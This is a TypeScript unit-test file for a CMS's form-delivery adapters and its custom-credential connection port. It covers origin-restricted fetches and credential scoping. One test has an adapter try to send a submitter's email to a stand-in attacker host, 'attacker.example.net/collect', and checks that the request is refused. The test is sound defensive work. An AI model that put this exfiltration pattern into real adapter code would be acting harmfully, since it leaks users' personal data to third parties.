import assert from "node:assert/strict";
import test from "node:test";

import { FormDeliveryError, type FormDeliveryJob, type FormDeliveryResult } from "@jini-ai/cms/forms";
import { AesGcmSecretSealer } from "#src/features/webhooks/secret-sealer.aesgcm";
import { InMemoryKeyring } from "#src/features/webhooks/keyring.memory";
import { createFakeClock } from "#src/__tests__/support/fake-clock";
import { createCustomCredential, InMemoryCustomCredentialSetRepo, type CustomCredentialSetRecord, type CustomCredentialWriteDeps } from "#src/features/custom-credentials/index";
import { createCustomCredentialConnectionPort } from "../connection-port.js";
import { createFormDestinationDeliverer } from "../deliver.js";
import { buildFormDestinationRegistry } from "../registry.js";
import type { FormDestinationCredential, FormDestinationKit, FormDestinationModule } from "../types.js";

/**
 * @file Unit tests for one push-delivery attempt's host half (`deliver.ts`) and the shipped
 * custom-credential connection port (`connection-port.ts`): what the adapter is called with, what
 * comes back, the attempt's host-bound kit, and the port's scope checks. The phase-A security pins
 * live in `delivery.security.test.ts`; these add the cases those do not reach.
 */

const W = "ws-deliver-unit";
// Built at runtime so no secret-shaped literal is committed.
const token = (tag: string) => `${tag}-${"u".repeat(20)}`;

function frozenJob(): FormDeliveryJob {
  return {
    binding: { bindingId: "b1", adapterId: "rows", connectionRef: "conn-1", enabled: true, formIds: ["f1"], config: { table: "leads" } },
    snapshot: { form: { slug: "contact", fields: [{ name: "email", required: true, label: "Email", type: "email" }, { name: "topics", required: false, multiple: true }] },
      submission: { id: "s1", answers: { email: "a@example.com", topics: ["x"] }, submittedAt: "2026-10-20T00:00:00.000Z" } },
    idempotencyKey: JSON.stringify(["s1", "b1"]),
  };
}

function registryWith(module: FormDestinationModule) {
  return buildFormDestinationRegistry({ refusals: [], loaded: [{ descriptor: { id: "rows", label: "Rows", module: "rows.mjs" }, pluginId: "p1", module }] });
}

type DeliverArgs = Parameters<NonNullable<FormDestinationModule["deliver"]>>[0];

/** A host kit that records what reaches the network, with or without the optional `now`. */
function hostKit({ withNow }: { withNow: boolean }) {
  const sent: { url: string; init: RequestInit; options: { readonly timeoutMs: number } }[] = [];
  const kit: FormDestinationKit = { timeouts: { request: 5_000 },
    fetch: async (url, init, options) => { sent.push({ url, init, options }); return new Response(null, { status: 201 }); },
    ...(withNow ? { now: () => 7 } : {}) };
  return { kit, sent };
}

function deliverer(required: { module: FormDestinationModule; credential?: FormDestinationCredential | null; kit?: FormDestinationKit }) {
  const credential = required.credential === undefined ? { token: token("c"), baseUrl: "https://rows.example.com/api" } : required.credential;
  return createFormDestinationDeliverer({ kit: required.kit ?? hostKit({ withNow: false }).kit, connections: async () => credential, loadRegistry: async () => registryWith(required.module) });
}

// ---- deliver.ts ----

test("the adapter is called with the frozen form, submission, binding and idempotency key, and the resolved credential", async () => {
  const calls: DeliverArgs[] = [];
  const credential = { token: token("args"), baseUrl: "https://rows.example.com/api", username: "ana" };
  const job = frozenJob();
  await deliverer({ credential, module: { deliver: async (args) => { calls.push(args); } } })({ workspaceId: W, job });
  assert.equal(calls.length, 1);
  const { kit: _kit, ...rest } = calls[0]!;
  assert.deepEqual(rest, { credential, form: job.snapshot.form, submission: job.snapshot.submission, binding: job.binding, idempotencyKey: '["s1","b1"]' });
});

test("the adapter's result is returned unchanged, success or failure", async () => {
  const results: (FormDeliveryResult | void)[] = [{ ok: true, reference: "row-9" }, { ok: false, error: { code: "rate-limited", retryable: true, retryAfterMs: 1_000, outcome: "not-applied" } }, undefined];
  for (const result of results) {
    assert.deepEqual(await deliverer({ module: { deliver: async () => result } })({ workspaceId: W, job: frozenJob() }), result);
  }
});

test("an error the adapter throws propagates as thrown (Jini's deliverFormJob sanitises it to a code)", async () => {
  const thrown = new Error("adapter broke");
  await assert.rejects(deliverer({ module: { deliver: async () => { throw thrown; } } })({ workspaceId: W, job: frozenJob() }), (error: unknown) => error === thrown);
});

test("an attempt leaves the frozen job unchanged and never writes the credential into it", async () => {
  const job = frozenJob();
  const before = structuredClone(job);
  const secret = token("never-in-job");
  await deliverer({ credential: { token: secret, baseUrl: "https://rows.example.com" }, module: { deliver: async () => ({ ok: true }) } })({ workspaceId: W, job });
  assert.deepEqual(job, before);
  assert.equal(JSON.stringify(job).includes(secret), false);
});

test("the adapter's kit has no now() when the host kit has none", async () => {
  let seen: FormDestinationKit | undefined;
  await deliverer({ kit: hostKit({ withNow: false }).kit, module: { deliver: async ({ kit }) => { seen = kit; } } })({ workspaceId: W, job: frozenJob() });
  assert.deepEqual(Object.keys(seen ?? {}).sort(), ["fetch", "timeouts"]);
});

test("an allowed fetch reaches the host kit with the adapter's init and options unchanged, and its response comes back", async () => {
  const { kit, sent } = hostKit({ withNow: true });
  const init: RequestInit = { method: "POST", body: "{}", headers: { "idempotency-key": "k" } };
  let status = 0;
  await deliverer({ kit, module: { deliver: async ({ kit: given }) => { status = (await given.fetch("https://rows.example.com/api/rows", init, { timeoutMs: 2_000 })).status; } } })({ workspaceId: W, job: frozenJob() });
  assert.equal(status, 201);
  assert.deepEqual(sent, [{ url: "https://rows.example.com/api/rows", init, options: { timeoutMs: 2_000 } }]);
});

test("with no additionalHosts saved only the baseUrl origin is reachable", async () => {
  const { kit, sent } = hostKit({ withNow: false });
  const outcomes: string[] = [];
  await deliverer({ kit, credential: { token: token("solo"), baseUrl: "https://rows.example.com/api" }, module: { deliver: async ({ kit: given }) => {
    for (const url of ["https://upload.rows.example.com/files", "https://rows.example.com:8443/api", "https://rows.example.com/elsewhere"]) {
      outcomes.push(await given.fetch(url, {}, { timeoutMs: 1_000 }).then(() => "sent", (error: unknown) => error instanceof FormDeliveryError ? error.message : "other"));
    }
  } } })({ workspaceId: W, job: frozenJob() });
  assert.deepEqual(outcomes, ["configuration-invalid", "configuration-invalid", "sent"]);
  assert.deepEqual(sent.map(request => request.url), ["https://rows.example.com/elsewhere"]);
});

test("a refused fetch carries only the safe code, non-retryable, outcome not-applied, never the URL or its answers", async () => {
  let refusal: unknown;
  const url = "https://attacker.example.net/collect?email=a%40example.com";
  await deliverer({ module: { deliver: async ({ kit }) => { await kit.fetch(url, {}, { timeoutMs: 1_000 }).catch((error: unknown) => { refusal = error; }); } } })({ workspaceId: W, job: frozenJob() });
  assert.ok(refusal instanceof FormDeliveryError);
  assert.deepEqual({ message: refusal.message, code: refusal.code, retryable: refusal.retryable, outcome: refusal.outcome, cause: refusal.cause },
    { message: "configuration-invalid", code: "configuration-invalid", retryable: false, outcome: "not-applied", cause: undefined });
  assert.equal(JSON.stringify(refusal).includes("attacker"), false);
});

// ---- connection-port.ts ----

function credentialDeps(repo: InMemoryCustomCredentialSetRepo = new InMemoryCustomCredentialSetRepo()): CustomCredentialWriteDeps {
  const keyring = new InMemoryKeyring();
  let n = 0;
  return { repo, sealer: new AesGcmSecretSealer(keyring), keyring,
    clock: createFakeClock({ startIso: "2026-10-20T00:00:00.000Z" }), idGen: { newId: () => `cred-unit-${++n}` } };
}

function save(deps: CustomCredentialWriteDeps, required: { worksFor?: string[]; username?: string; additionalHosts?: string[] }) {
  return createCustomCredential(deps, { workspaceId: W, label: "Rows", category: "general", baseUrl: "https://rows.example.com",
    ...(required.additionalHosts ? { additionalHosts: required.additionalHosts } : {}),
    ...(required.worksFor ? { worksFor: required.worksFor } : {}), connection: { token: token("port"), ...(required.username ? { username: required.username } : {}) } });
}

test("the connection port passes the saved username along with the token", async () => {
  const deps = credentialDeps();
  const saved = await save(deps, { worksFor: ["rows"], username: "ana@example.com" });
  assert.deepEqual(await createCustomCredentialConnectionPort({ credentials: deps })({ workspaceId: W, connectionRef: saved.id, adapterId: "rows" }),
    { token: token("port"), baseUrl: "https://rows.example.com", additionalHosts: [], username: "ana@example.com" });
});

test("the connection port matches the adapter id against worksFor case-insensitively", async () => {
  const deps = credentialDeps();
  const saved = await save(deps, { worksFor: ["Rows"] });
  assert.equal((await createCustomCredentialConnectionPort({ credentials: deps })({ workspaceId: W, connectionRef: saved.id, adapterId: "ROWS" }))?.token, token("port"));
});

test("a credential saved without worksFor is handed to no adapter", async () => {
  const deps = credentialDeps();
  const saved = await save(deps, {});
  assert.equal(await createCustomCredentialConnectionPort({ credentials: deps })({ workspaceId: W, connectionRef: saved.id, adapterId: "rows" }), null);
});

test("a connectionRef no saved credential has yields no credential", async () => {
  const deps = credentialDeps();
  await save(deps, { worksFor: ["rows"] });
  assert.equal(await createCustomCredentialConnectionPort({ credentials: deps })({ workspaceId: W, connectionRef: "cred-missing", adapterId: "rows" }), null);
});

test("the vault's own read errors propagate instead of reading as no credential", async () => {
  class FailingRepo extends InMemoryCustomCredentialSetRepo {
    override async findById(): Promise<CustomCredentialSetRecord | null> { throw new Error("vault offline"); }
  }
  const port = createCustomCredentialConnectionPort({ credentials: credentialDeps(new FailingRepo()) });
  await assert.rejects(port({ workspaceId: W, connectionRef: "cred-1", adapterId: "rows" }), { message: "vault offline" });
});

test("each port call reads the vault afresh: a credential deleted after one attempt is gone for the next", async () => {
  const repo = new InMemoryCustomCredentialSetRepo();
  const deps = credentialDeps(repo);
  const saved = await save(deps, { worksFor: ["rows"] });
  const port = createCustomCredentialConnectionPort({ credentials: deps });
  assert.equal((await port({ workspaceId: W, connectionRef: saved.id, adapterId: "rows" }))?.token, token("port"));
  await repo.delete({ workspaceId: W, id: saved.id });
  assert.equal(await port({ workspaceId: W, connectionRef: saved.id, adapterId: "rows" }), null);
});
